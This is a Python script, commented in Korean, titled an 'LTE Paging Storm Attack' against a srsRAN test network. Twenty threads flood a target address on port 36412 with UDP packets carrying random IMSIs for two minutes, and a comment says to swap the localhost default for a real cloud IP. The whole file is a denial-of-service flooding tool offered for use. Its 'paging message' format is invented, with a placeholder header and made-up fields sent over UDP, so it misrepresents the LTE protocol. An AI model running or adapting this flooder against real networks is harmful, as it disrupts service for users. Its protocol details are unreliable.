#!/usr/bin/env python3
"""
LTE Paging Storm Attack
srsRAN 환경에서 대량의 Paging 메시지를 전송하여 UE의 리소스를 고갈시키는 공격
"""

import socket
import struct
import time
import threading
import random
import sys

class PagingStormAttack:
    def __init__(self, target_ip, target_port=36412, num_pages=10000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_pages = num_pages
        self.attack_threads = []
        self.running = False
        
    def generate_imsi(self):
        """임의의 IMSI 생성"""
        return random.randint(100000000000000, 999999999999999)
    
    def create_paging_message(self, imsi):
        """Paging 메시지 생성"""
        # 간단한 Paging 메시지 구조
        paging_msg = struct.pack('>I', 0x12345678)  # Message Header
        paging_msg += struct.pack('>H', 0x0002)     # Message Type (Paging)
        paging_msg += struct.pack('>Q', imsi)       # IMSI
        paging_msg += struct.pack('>H', 0x0001)     # Paging Cause
        return paging_msg
    
    def send_paging_burst(self, burst_size=100, interval=0.1):
        """Paging 메시지 버스트 전송"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running:
            try:
                # 버스트 전송
                for _ in range(burst_size):
                    imsi = self.generate_imsi()
                    paging_packet = self.create_paging_message(imsi)
                    sock.sendto(paging_packet, (self.target_ip, self.target_port))
                
                # 간격 대기
                time.sleep(interval)
                
            except Exception as e:
                print(f"Paging 전송 오류: {e}")
                break
        
        sock.close()
    
    def start_attack(self, duration=60, num_threads=10):
        """공격 시작"""
        print(f"Paging Storm 공격 시작...")
        print(f"대상: {self.target_ip}:{self.target_port}")
        print(f"스레드 수: {num_threads}")
        print(f"지속 시간: {duration}초")
        
        self.running = True
        
        # 여러 스레드로 동시 공격
        for i in range(num_threads):
            thread = threading.Thread(
                target=self.send_paging_burst,
                args=(100, 0.05)  # 100개씩 0.05초 간격
            )
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
        
        print(f"{num_threads}개 공격 스레드 시작됨")
        
        # 공격 지속 시간 대기
        time.sleep(duration)
        self.stop_attack()
    
    def stop_attack(self):
        """공격 중지"""
        print("공격 중지 중...")
        self.running = False
        
        for thread in self.attack_threads:
            thread.join(timeout=1)
        
        print("공격 완료")

def main():
    # 공격 대상 설정
    target_ip = "127.0.0.1"  # 클라우드 환경에서는 실제 IP로 변경
    target_port = 36412
    
    # 공격 파라미터
    duration = 120
    num_threads = 20
    
    attack = PagingStormAttack(target_ip, target_port)
    
    try:
        attack.start_attack(duration, num_threads)
    except KeyboardInterrupt:
        print("\n사용자에 의해 중단됨")
        attack.stop_attack()

if __name__ == "__main__":
    main()
